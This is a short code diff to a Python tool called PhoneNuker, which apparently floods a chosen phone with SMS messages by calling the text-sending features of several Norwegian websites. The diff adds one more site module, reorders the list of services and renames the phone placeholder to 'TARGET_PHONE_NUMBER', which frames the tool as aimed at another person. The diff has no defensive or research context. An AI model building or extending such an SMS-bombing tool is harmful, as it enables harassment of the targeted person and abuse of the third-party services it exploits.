@@ -3,13 +3,15 @@ import aiohttp
 
 from site_request.site_1881 import Request as request_1881
 from site_request.site_power import Request as request_power  
+from site_request.site_skyss import Request as request_skyss  
 
 class PhoneNuker:
     def __init__(self):
-        self.phone_number = "YOUR_PHONE_NUMBER_HERE" 
+        self.phone_number = "TARGET_PHONE_NUMBER"  
         self.request_services = [
-            request_1881,
-            request_power
+            request_skyss,
+            request_power,
+            request_1881
         ]
 
     async def spam_sms_single(self, session, service_index):
